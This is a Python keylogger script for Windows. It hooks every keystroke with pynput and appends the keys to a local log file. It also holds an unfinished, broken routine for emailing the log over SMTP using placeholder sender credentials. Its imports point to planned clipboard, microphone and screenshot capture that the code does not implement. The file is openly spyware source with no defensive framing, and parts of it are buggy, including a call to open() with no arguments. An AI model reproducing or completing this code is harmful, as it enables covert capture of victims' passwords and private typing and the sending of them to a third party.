
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from typing import Counter, NoReturn
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


keys_information = "keylogs.txt"
filepath = 'D:\\softwares\\keylogger'
extend = '\\'
count = 0
keys = []


email_id = "Your Email address goes here"
email_password = "Password for above Email entered goes here"
email_receiver = "Receiver Email address goes here"


def send_mail(filename, attachment, email_receiver):
    email_sender = email_id
    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['Subject'] = "Log File"
    body = "some text"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open()


def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(filepath + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc :
        return False


with Listener(on_press = on_press,on_release = on_release) as listener:
    listener.join()
